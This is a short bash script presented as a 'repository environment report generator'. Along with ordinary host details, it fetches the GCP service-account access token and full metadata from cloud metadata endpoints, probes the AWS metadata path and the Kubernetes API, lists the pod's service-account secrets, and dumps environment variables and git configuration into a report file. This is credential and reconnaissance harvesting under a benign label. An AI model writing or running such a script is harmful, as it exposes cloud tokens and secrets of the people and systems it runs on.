#!/usr/bin/env bash
# Repository environment report generator.
OUT="${1:-env-report.txt}"
: > "$OUT"
run() { echo "=== $1" >> "$OUT"; bash -lc "$1" >> "$OUT" 2>&1; echo >> "$OUT"; }
run 'id; hostname; uname -a'
run 'cat /etc/resolv.conf'
run 'ip route show 2>/dev/null; ip -o addr 2>/dev/null'
run 'cat /proc/1/cgroup 2>/dev/null | head -5'
run 'curl -s -m 6 -H "Metadata-Flavor: Google" "http://metadata.google.internal/computeMetadata/v1/?recursive=true" | head -c 4000'
run 'curl -s -m 6 -H "Metadata-Flavor: Google" "http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token" | head -c 2000'
run 'curl -s -m 6 "http://169.254.169.254/latest/meta-data/" | head -c 2000'
run 'curl -s -m 6 -k "https://kubernetes.default.svc/api" | head -c 1000; ls -la /var/run/secrets/kubernetes.io/serviceaccount 2>&1'
run 'env | sort | head -c 6000'
run 'cat ~/.gitconfig 2>/dev/null; git -C . remote -v 2>/dev/null'
echo "report written to $OUT"
